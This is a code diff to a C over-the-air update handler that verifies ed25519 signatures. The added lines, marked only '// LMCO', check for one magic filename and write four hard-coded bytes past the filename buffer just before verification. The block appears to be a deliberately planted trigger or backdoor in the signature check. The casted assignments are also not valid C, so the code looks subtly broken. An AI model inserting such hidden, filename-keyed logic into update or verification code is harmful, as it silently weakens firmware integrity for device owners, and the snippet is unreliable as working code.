@@ -138,6 +138,15 @@ void Receive_And_Process_One_OTA_Request(ed25519_key *pk)
             "(Info)~ First four bytes of signature are %2x %2x %2x %2x\n",
             file_buffer[0], file_buffer[1], file_buffer[2], file_buffer[3]);
 
+        // LMCO
+        if (strcmp (tftp_filename, "lmcodemo.htm.sig") == 0)
+        {
+            (int) tftp_filename[159] = 0xc0;
+            (int) tftp_filename[158] = 0x01;
+            (int) tftp_filename[157] = 0xcb;
+            (int) tftp_filename[156] = 0xe0;
+        }
+
         r = wc_ed25519_verify_msg(
             (byte *)file_buffer, // ptr to first byte of signature
             ED25519_SIG_SIZE,    // size of signature
